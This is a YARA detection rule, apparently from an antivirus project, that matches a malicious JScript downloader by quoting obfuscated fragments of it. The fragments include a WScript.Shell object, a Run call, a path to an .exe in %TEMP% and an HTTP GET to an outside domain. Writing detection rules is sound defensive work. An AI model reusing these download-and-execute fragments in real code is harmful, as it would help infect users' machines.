rule sig_20160329_ea45dc31baafc42c714a30c1523fad3b {
  meta:
    description = "datamaliciousorder - file 20160329_ea45dc31baafc42c714a30c1523fad3b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f7ae894cdff21c7ac76dda4f851b11c0df7b9ade7d1f33589356680b426acd9e"

  strings:
    $s1  = "function Lwkstadxd() {return Coekmglh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"zQuEVwmwFzlKFlN.exe\";};" fullword ascii
    $s2  = "Lotcmtjb[Yrpkr](\"GET\", \"http://princesse-indienne.com/m6yaf\", false);" fullword ascii
    $s3  = "var Coekmglh = function Lehvfic() {return WScript[Dbrjg](\"WScript.Shell\");}();" fullword ascii
    $s4  = "do {WScript[Ftuanope](Wprcdgdya() * 11)} while (Lotcmtjb[\"readystate\"] < 2 * 2);" fullword ascii
    $s5  = "function Jxnvfs(Seqvbgmiqw, Qyofas){return Seqvbgmiqw - Qyofas;};" fullword ascii
    $s6  = "function Xxseqpitc(Vchgwbrhfn){Coekmglh[\"Run\"](Vchgwbrhfn, Kjvfrc, Kjvfrc);};" fullword ascii
    $s7  = "function Fqnidvbr() {return ((Jrcennqw == true) && (Jrcennqw == Vaapp)) ? 1 : Kjvfrc;};" fullword ascii
    $s8  = "return Jxnvfs(Ylsaheurf, Derxdyyoc);" fullword ascii
    $s9  = "Vaapp = true; " fullword ascii
    $s10 = "function Wprcdgdya(){return 22;};" fullword ascii
    $s11 = " while (Qgmafidihe){" fullword ascii
    $s12 = "var Jrcennqw = false;" fullword ascii
    $s13 = "function Xmvzgtyho(){return Dbrjg;};" fullword ascii
    $s14 = "var Dsbflcotsi = new this[\"Date\"]();" fullword ascii
    $s15 = "function Yzhmyf()" fullword ascii
    $s16 = "function Czacusdq(Sunanbk) {var Iutqpz = (1, 2, 3, 4, 5, Sunanbk); return Iutqpz;};" fullword ascii
    $s17 = "Jrcennqw = true; " fullword ascii
    $s18 = "var Vaapp = false;" fullword ascii
    $s19 = "var Escchqumbl = false;" fullword ascii
    $s20 = "function Ylvjzzirm(){return Cbtvqzeur;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}